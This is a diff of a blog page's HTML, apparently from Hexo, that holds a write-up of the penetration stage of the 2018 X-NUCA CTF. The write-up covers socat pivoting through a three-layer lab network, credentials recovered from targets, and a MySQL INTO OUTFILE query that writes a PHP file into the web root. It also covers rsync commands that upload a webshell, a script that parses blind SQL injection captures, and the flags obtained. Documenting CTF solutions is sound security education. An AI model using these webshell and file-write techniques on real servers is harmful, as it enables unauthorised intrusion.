@@ -90,6 +90,17 @@
   };
 </script>
 
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
 
   
 
@@ -101,27 +112,27 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="2018X-NUCA线下渗透题总结">
 <meta property="og:url" content="https://zo1ro.github.io/2018/12/07/xnuca/index.html">
-<meta property="og:site_name" content="一个向往acm的ctf_dog">
+<meta property="og:site_name" content="ZO1RO">
 <meta property="og:description" content="前言这次x-npwn比赛时间两天，赛制是第一天先通过一个渗透测试环境，找到第二天要打的pwn题目和攻击机的密码（先找到先getshell，没找到就只能等预定官方时间颁布题目），所以最终都是为了pwn爷爷搭台子：）">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/1.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/7.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/3.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/6.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/4.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/5.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/8.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/9.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/2.png">
-<meta property="og:updated_time" content="2019-05-08T15:27:59.125Z">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/1.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/7.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/3.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/6.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/4.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/5.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/8.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/9.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/07/xnuca/2.png">
+<meta property="og:updated_time" content="2019-05-09T16:26:34.924Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018X-NUCA线下渗透题总结">
 <meta name="twitter:description" content="前言这次x-npwn比赛时间两天，赛制是第一天先通过一个渗透测试环境，找到第二天要打的pwn题目和攻击机的密码（先找到先getshell，没找到就只能等预定官方时间颁布题目），所以最终都是为了pwn爷爷搭台子：）">
-<meta name="twitter:image" content="https://zo1ro.github.io/2018/12/07/xnuca/xnuca/1.png">
+<meta name="twitter:image" content="https://zo1ro.github.io/2018/12/07/xnuca/1.png">
 
 
 
-  <link rel="alternate" href="/atom.xml" title="一个向往acm的ctf_dog" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="ZO1RO" type="application/atom+xml">
 
 
 
@@ -137,7 +148,7 @@
   };
 </script>
 
-  <title>2018X-NUCA线下渗透题总结 | 一个向往acm的ctf_dog</title>
+  <title>2018X-NUCA线下渗透题总结 | ZO1RO</title>
   
 
 
@@ -196,10 +207,14 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">一个向往acm的ctf_dog</span>
+        <span class="site-title">ZO1RO</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
+    
+      
+        <p class="site-subtitle">一个向往acm的ctf_dog</p>
+      
     
     
   </div>
@@ -345,7 +360,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="一个向往acm的ctf_dog">
+      <meta itemprop="name" content="ZO1RO">
     </span>
 
     
@@ -382,22 +397,6 @@
               <time title="Created: 2018-12-07 15:41:34" itemprop="dateCreated datePublished" datetime="2018-12-07T15:41:34+08:00">2018-12-07</time>
             
 
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-05-08 23:27:59" itemprop="dateModified" datetime="2019-05-08T23:27:59+08:00">2019-05-08</time>
-              
             
           </span>
 
@@ -436,12 +435,12 @@
 <p>得分点IP： /etc/xnuca/score_ip_list.txt</p>
 <p>攻防flag位置： /opt/xnuca/flag.txt</p>
 <p>比赛拓扑</p>
-<p><img src="xnuca\1.png" alt="1"></p>
+<p><img src="1.png" alt="1"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.109.1.11  -- 22 80 139 443 445</span><br><span class="line">aka 10.109.3.11</span><br><span class="line">Nmap scan report for 10.109.1.12  -- 22 80 139 445</span><br><span class="line">aka 10.109.3.12</span><br><span class="line">Nmap scan report for 10.109.1.13  -- 22 80 139 445</span><br><span class="line">aka 10.109.2.13</span><br><span class="line">Nmap scan report for 10.109.1.14  -- 22 80 139 445</span><br><span class="line">aka 10.109.2.14</span><br><span class="line">Nmap scan report for 10.109.2.15  -- 22 80 139 445</span><br><span class="line">Nmap scan report for 10.109.2.16  -- 22 80 139 445</span><br><span class="line">Nmap scan report for 10.109.2.17  -- 21 22 139 445</span><br><span class="line">Nmap scan report for 10.109.3.18  -- 22 139 445</span><br><span class="line">Nmap scan report for 10.109.3.19  -- 22 139 445 3306</span><br><span class="line">Nmap scan report for 10.109.1.20  -- 22 139 445 873(rsync)</span><br><span class="line">Nmap scan report for 10.109.1.30  -- 22 139 445</span><br></pre></td></tr></table></figure>
 <p>一共三层网络，二层和三层只能通过一层访问，即<strong>10.109.2.0</strong>与<strong>10.109.3.0</strong>只能通过<strong>10.109.1.11-14</strong>访问，通过两层跳板转发至本地。</p>
 <h4 id="socat转发命令"><a href="#socat转发命令" class="headerlink" title="socat转发命令"></a>socat转发命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./socat -v tcp-listen:11480,reuseaddr,fork tcp-connect:10.109.1.14:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
 <p>比赛hint</p>
-<p><img src="xnuca/7.png" alt="7"></p>
+<p><img src="7.png" alt="7"></p>
 <h3 id="探测题flag位置"><a href="#探测题flag位置" class="headerlink" title="探测题flag位置"></a>探测题flag位置</h3><p> /etc/xnuca/flag.txt</p>
 <h3 id="info1"><a href="#info1" class="headerlink" title="info1"></a>info1</h3><p>10.109.1.11:80</p>
 <p>访问链接自动跳转到https，hint提示与某些端口的https报错信息有关，将443端口转发到本地，查看证书发现用户名和密码</p>
@@ -457,7 +456,7 @@
 <p>通过文件上传漏洞上传一个phpmyadmin，然后进入查看后台数据库。</p>
 <p>数据库： root / yuemingxingxi（数据库配置文件中）</p>
 <h3 id="info3"><a href="#info3" class="headerlink" title="info3"></a>info3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.13:80</span><br></pre></td></tr></table></figure>
-<p><img src="xnuca/3.png" alt="3"></p>
+<p><img src="3.png" alt="3"></p>
 <p>存在一个webshell，webshell-path-/theinf03sh3ll.php（来源info1的后台提示）</p>
 <p>password: comeonbaby_1 (来自下面的数据库)</p>
 <p>塞马</p>
@@ -470,14 +469,14 @@
 <p>select load_file(‘/etc/xnuca/flag.txt’);</p>
 <p>发现没权限读，猜测mysql先写马后执行</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO webshell( password )</span><br><span class="line">VALUES (</span><br><span class="line">'&lt;?php phpinfo();?&gt;'</span><br><span class="line">);</span><br><span class="line">SELECT *</span><br><span class="line">FROM webshell</span><br><span class="line">INTO OUTFILE '/var/www/html/mm.php';</span><br></pre></td></tr></table></figure>
-<p><img src="xnuca/6.png" alt="6"></p>
-<p><img src="xnuca/4.png" alt="4"></p>
-<p><img src="xnuca/5.png" alt="5"></p>
+<p><img src="6.png" alt="6"></p>
+<p><img src="4.png" alt="4"></p>
+<p><img src="5.png" alt="5"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: tance_flag&#123;6949f9b9d4895f8d211f91eda25bd1905d9859c2185aa1da846a71b071800218&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="info5"><a href="#info5" class="headerlink" title="info5"></a>info5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.2.15:80</span><br></pre></td></tr></table></figure>
 <p>根据其他题目翻到info5.pcap，分析流量包是一个盲注爆破猜解后台密码</p>
-<p><img src="xnuca/8.png" alt="8"></p>
-<p><img src="xnuca/9.png" alt="9"></p>
+<p><img src="8.png" alt="8"></p>
+<p><img src="9.png" alt="9"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">wpname = &#123;&#125;</span><br><span class="line">wppass = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">276</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news.php'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = urllib.parse.unquote(f.read())</span><br><span class="line">            name = data.split(<span class="string">'('</span>)[<span class="number">5</span>].split()[<span class="number">0</span>]</span><br><span class="line">            offset = data.split()[<span class="number">12</span>].split(<span class="string">','</span>)[<span class="number">2</span>]</span><br><span class="line">            ll = data.split(<span class="string">'))'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i + <span class="number">1</span>)) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            result = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'shit'</span> <span class="keyword">in</span> data:</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i)) <span class="keyword">as</span> f:</span><br><span class="line">            data = urllib.parse.unquote(f.read())</span><br><span class="line">            name = data.split(<span class="string">'('</span>)[<span class="number">5</span>].split()[<span class="number">0</span>]</span><br><span class="line">            offset = data.split()[<span class="number">12</span>].split(<span class="string">','</span>)[<span class="number">2</span>]</span><br><span class="line">            ll = data.split(<span class="string">'))'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i + <span class="number">1</span>)) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            result = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'shit'</span> <span class="keyword">in</span> data:</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">    print(name, offset, ll, result)</span><br></pre></td></tr></table></figure>
 <p>后台密码： admin / stopthatphonecall</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt:</span><br><span class="line">tance_flag&#123;f5b25af4caa57cfd277bf00d13ec13ad906ae32ee0e191311595c7e472bc0e78&#125;</span><br></pre></td></tr></table></figure>
@@ -510,7 +509,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz 192.168.1.10::web/1.php /rootrsync -avz 10.0.0.12::web/ /var/tmp</span><br></pre></td></tr></table></figure>
 <p>上传文件到服务器</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz webshell.php 192.168.1.10::web/</span><br></pre></td></tr></table></figure>
-<p><img src="xnuca/2.png" alt="2"></p>
+<p><img src="2.png" alt="2"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tance_flag&#123;cb6d84b1d39823f495f994946ea29f2e7d75b6ab8710d1408ec8fa7a691c2746&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.30:22</span><br></pre></td></tr></table></figure>
 <p>靶场翻到</p>
@@ -548,7 +547,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/ctf/" rel="tag">📖ctf</a>
           
         </div>
       
@@ -642,7 +641,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -665,7 +664,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                    <span class="site-state-item-count">3</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -684,6 +685,32 @@
 
           
 
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ZO1RO" title="GitHub &rarr; https://github.com/ZO1RO" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:em8xcm93ZWJAMTYzLmNvbQo=" title="E-Mail &rarr; mailto:em8xcm93ZWJAMTYzLmNvbQo=" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
           
 
           
@@ -836,9 +863,18 @@
 
 
 
+  
+  
 
 
 
+  
+  
+
+
+
+  
+  
 
 
 
@@ -854,6 +890,18 @@
 
   
   <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_lines.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_sphere.min.js"></script>
 
 
   
@@ -907,6 +955,13 @@
   
 
   
+  
+
+  
+  
+
+  
+
 
   
 
